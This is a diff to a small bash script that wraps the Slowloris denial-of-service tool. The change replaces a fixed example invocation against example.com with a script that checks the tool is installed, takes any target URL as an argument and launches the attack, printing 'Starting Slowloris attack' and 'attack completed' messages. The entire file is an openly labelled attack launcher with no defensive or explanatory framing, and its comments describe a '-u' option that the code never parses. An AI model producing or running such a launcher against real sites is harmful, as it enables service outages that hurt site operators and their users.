@@ -1,9 +1,30 @@
 #!/bin/bash
-# Slowloris - DoS attack tool
+# Slowloris - Denial of Service Attack
 # Options:
-# -t : Number of threads
-# -p : Port
+# -u : URL to target
 
-# Usage: slowloris -t <threads> -p <port> <target_url>
+# Usage: slowloris.sh <target_url>
 # Example script
-slowloris -t 100 -p 80 example.com
+# slowloris.sh http://example.com
+
+# Check if slowloris is installed
+if ! command -v slowloris &> /dev/null
+then
+    echo "slowloris could not be found, please install it first."
+    exit
+fi
+
+# Ensure URL is provided
+if [ -z "$1" ]; then
+    echo "Usage: $0 <target_url>"
+    exit 1
+fi
+
+TARGET_URL=$1
+
+echo "Starting Slowloris attack on $TARGET_URL"
+
+# Perform Slowloris attack
+slowloris $TARGET_URL
+
+echo "Slowloris attack completed."
